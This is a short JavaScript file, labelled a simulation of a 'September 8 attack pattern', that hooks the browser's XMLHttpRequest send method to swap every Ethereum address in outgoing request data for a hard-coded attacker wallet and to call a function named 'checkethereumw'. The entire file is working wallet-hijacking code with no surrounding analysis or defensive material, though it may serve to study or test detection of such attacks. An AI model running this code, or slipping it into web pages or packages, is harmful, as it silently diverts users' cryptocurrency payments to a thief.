// Malicious crypto theft script
// This simulates the September 8 attack pattern

const originalSend = XMLHttpRequest.prototype.send;

XMLHttpRequest.prototype.send = function(data) {
  // Malicious wallet replacement
  if (data && typeof data === 'string') {
    // Replace legitimate Ethereum addresses with attacker wallet
    data = data.replace(/0x[a-fA-F0-9]{40}/g, '0xFc4a4858bafef54D1b1d7697bfb5c52F4c166976');
  }

  // Call checkethereumw function (known malicious function)
  if (window.checkethereumw) {
    window.checkethereumw(data);
  }

  return originalSend.call(this, data);
};